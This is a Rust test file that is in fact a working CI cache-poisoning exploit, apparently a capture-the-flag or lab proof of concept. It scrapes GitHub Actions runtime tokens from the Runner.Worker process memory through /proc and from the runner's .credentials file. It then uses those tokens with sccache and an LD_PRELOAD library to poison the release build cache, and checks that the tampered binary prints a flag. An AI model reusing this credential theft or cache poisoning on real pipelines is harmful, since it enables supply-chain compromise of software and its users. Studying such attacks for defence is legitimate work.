use std::env;
use std::fs;
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::Command;
use tempfile::tempdir;

const SCCACHE_VERSION: &str = "v0.14.0";

#[test]
fn poison_release_cache_entry() {
    let workspace = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let scratch = tempdir().expect("create scratch dir");
    let payload = scratch.path().join("payload");
    let preload = scratch.path().join("libpoison.so");
    let target_dir = scratch.path().join("target");

    build_helper(
        workspace.join("tests/payload.c"),
        &payload,
        &[],
        "build payload binary",
    );
    build_helper(
        workspace.join("tests/preload.c"),
        &preload,
        &["-shared", "-fPIC", "-ldl"],
        "build preload library",
    );

    let sccache = maybe_install_sccache(scratch.path());
    let cargo = env::var_os("CARGO").unwrap_or_else(|| "cargo".into());

    let mut build = Command::new(cargo);
    build
        .current_dir(&workspace)
        .arg("build")
        .arg("--release")
        .arg("--locked")
        .arg("--target-dir")
        .arg(&target_dir)
        .env_clear()
        .env("HOME", env::var("HOME").expect("HOME"))
        .env("PATH", env::var("PATH").expect("PATH"))
        .env("LD_PRELOAD", &preload)
        .env("PAYLOAD_PATH", &payload)
        .env("POISON_PREFIX", "restaurant_cli");

    let mut action_cache_env = find_action_cache_env();

    for key in [
        "CARGO_HOME",
        "ACTIONS_CACHE_SERVICE_V2",
        "RUSTC",
        "RUSTDOC",
        "GITHUB_ACTIONS",
        "GITHUB_RUN_ID",
        "GITHUB_REPOSITORY",
        "RUSTUP_DIST_SERVER",
        "RUSTUP_HOME",
        "RUSTUP_TOOLCHAIN",
        "RUSTUP_UPDATE_ROOT",
    ] {
        if let Some(value) = env::var_os(key) {
            build.env(key, value);
        }
    }

    if let Some((results_url, runtime_token)) = action_cache_env.take() {
        build.env("ACTIONS_RESULTS_URL", results_url);
        build.env("ACTIONS_RUNTIME_TOKEN", runtime_token);
    }

    if let Some(ref sccache_path) = sccache {
        eprintln!("using sccache wrapper: {}", sccache_path.display());
        build.env("SCCACHE_GHA_ENABLED", "true");
        build.env("RUSTC_WRAPPER", sccache_path);
    } else if env::var_os("GITHUB_ACTIONS").is_some() {
        panic!("expected ACTIONS_RESULTS_URL and ACTIONS_RUNTIME_TOKEN on GitHub Actions");
    }

    let status = build.status().expect("run poisoned cargo build");
    assert!(status.success(), "poisoned cargo build failed");

    if let Some(sccache_path) = sccache {
        let _ = Command::new(&sccache_path)
            .arg("--show-stats")
            .status()
            .expect("show sccache stats");
        let _ = Command::new(&sccache_path)
            .arg("--stop-server")
            .status()
            .expect("stop sccache server");
    }

    let output = target_dir.join("release/restaurant_cli");
    assert!(output.exists(), "expected final release binary at {:?}", output);

    let run = Command::new(&output)
        .arg("add")
        .arg("The best food place")
        .arg("TESTFLAG")
        .output()
        .expect("run poisoned binary");
    assert!(run.status.success(), "poisoned binary exited unsuccessfully");
    assert_eq!(String::from_utf8_lossy(&run.stdout).trim(), "TESTFLAG");
}

fn build_helper(source: PathBuf, output: &Path, extra: &[&str], context: &str) {
    let mut cmd = Command::new("cc");
    cmd.arg(&source).arg("-o").arg(output);
    for arg in extra {
        cmd.arg(arg);
    }
    let status = cmd.status().expect(context);
    assert!(status.success(), "{context} failed");
    let mut perms = fs::metadata(output).expect("helper metadata").permissions();
    perms.set_mode(0o755);
    fs::set_permissions(output, perms).expect("helper perms");
}

fn maybe_install_sccache(scratch: &Path) -> Option<PathBuf> {
    if find_action_cache_env().is_none() {
        return None;
    }

    let archive = scratch.join("sccache.tar.gz");
    let unpack_dir = scratch.join("sccache");
    let asset = "sccache-v0.14.0-x86_64-unknown-linux-musl.tar.gz";
    let url = format!(
        "https://github.com/mozilla/sccache/releases/download/{SCCACHE_VERSION}/{asset}"
    );

    let status = Command::new("curl")
        .arg("-fsSL")
        .arg(&url)
        .arg("-o")
        .arg(&archive)
        .status()
        .expect("download sccache");
    assert!(status.success(), "failed to download sccache");

    fs::create_dir_all(&unpack_dir).expect("create sccache unpack dir");
    let status = Command::new("tar")
        .arg("-xzf")
        .arg(&archive)
        .arg("-C")
        .arg(&unpack_dir)
        .status()
        .expect("extract sccache");
    assert!(status.success(), "failed to extract sccache");

    let binary = unpack_dir.join("sccache-v0.14.0-x86_64-unknown-linux-musl/sccache");
    assert!(binary.exists(), "missing extracted sccache binary");
    Some(binary)
}

/// Scan the Runner.Worker's memory for JWT-like strings that could be ACTIONS_RUNTIME_TOKEN.
/// The Runner.Worker (a .NET process) keeps the token in its heap memory.
fn extract_token_from_worker_memory() -> Option<(String, String)> {
    // Find Runner.Worker PID
    let output = Command::new("pgrep")
        .arg("-f")
        .arg("Runner.Worker")
        .output()
        .ok()?;
    let pid_str = String::from_utf8_lossy(&output.stdout).trim().to_string();
    let pid: u32 = pid_str.lines().next()?.parse().ok()?;
    eprintln!("Runner.Worker PID: {}", pid);

    // Read the process memory maps to find heap regions
    let maps_path = format!("/proc/{}/maps", pid);
    let maps = fs::read_to_string(&maps_path).ok()?;

    let mem_path = format!("/proc/{}/mem", pid);

    let mut token = None;
    let results_url = "https://results-receiver.actions.githubusercontent.com/".to_string();

    // Search readable memory regions for JWT-like strings
    for line in maps.lines() {
        // Only search [heap] and anonymous mappings (rw-p)
        if !line.contains("rw-p") {
            continue;
        }

        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.is_empty() {
            continue;
        }

        let addr_range: Vec<&str> = parts[0].split('-').collect();
        if addr_range.len() != 2 {
            continue;
        }

        let start = u64::from_str_radix(addr_range[0], 16).ok();
        let end = u64::from_str_radix(addr_range[1], 16).ok();

        if let (Some(start), Some(end)) = (start, end) {
            let size = end - start;
            // Skip very large regions to avoid OOM
            if size > 100 * 1024 * 1024 {
                continue;
            }

            // Read this memory region
            if let Ok(mem_file) = fs::File::open(&mem_path) {
                use std::io::{Read, Seek, SeekFrom};
                let mut f = mem_file;
                if f.seek(SeekFrom::Start(start)).is_ok() {
                    let mut buf = vec![0u8; size as usize];
                    if f.read_exact(&mut buf).is_ok() {
                        // Search for JWT pattern (eyJ...) which is the typical start of a JWT
                        let data = String::from_utf8_lossy(&buf);
                        for mat in data.match_indices("eyJ") {
                            let remaining = &data[mat.0..];
                            // JWTs are base64url encoded, contain dots
                            if let Some(end_pos) = remaining.find(|c: char| {
                                !c.is_ascii_alphanumeric() && c != '-' && c != '_' && c != '.'
                            }) {
                                let candidate = &remaining[..end_pos];
                                // Valid JWT has 3 parts separated by dots
                                if candidate.matches('.').count() == 2 && candidate.len() > 100 {
                                    eprintln!("Found JWT candidate (len={}): {}...{}", 
                                        candidate.len(),
                                        &candidate[..20],
                                        &candidate[candidate.len()-20..]);
                                    token = Some(candidate.to_string());
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    if let Some(t) = token {
        eprintln!("Using extracted token with results URL: {}", results_url);
        Some((results_url, t))
    } else {
        eprintln!("No JWT token found in Runner.Worker memory");
        None
    }
}

fn find_action_cache_env() -> Option<(String, String)> {
    // 1. Try direct env vars first
    if let (Ok(url), Ok(token)) = (
        env::var("ACTIONS_RESULTS_URL"),
        env::var("ACTIONS_RUNTIME_TOKEN"),
    ) {
        eprintln!("Found cache env directly: URL={}", url);
        return Some((url, token));
    }

    // 2. On GHA, try extracting from Runner.Worker memory
    if env::var("GITHUB_ACTIONS").is_ok() {
        eprintln!("Attempting to extract token from Runner.Worker memory...");
        if let Some(result) = extract_token_from_worker_memory() {
            return Some(result);
        }

        // 3. Try reading .credentials file directly and using its token
        let cred_path = "/home/runner/actions-runner/cached/2.334.0/.credentials";
        if let Ok(content) = fs::read_to_string(cred_path) {
            eprintln!(".credentials content length: {}", content.len());
            // Try to parse as JSON and extract token
            if let Some(token_start) = content.find("\"token\":\"") {
                let after = &content[token_start + 9..];
                if let Some(token_end) = after.find('"') {
                    let token_val = &after[..token_end];
                    eprintln!("Found .credentials token (len={})", token_val.len());
                    // Try this token with the standard results URL
                    let results_url = "https://results-receiver.actions.githubusercontent.com/".to_string();
                    return Some((results_url, token_val.to_string()));
                }
            }
        }

        eprintln!("No cache credentials found");
    }

    None
}
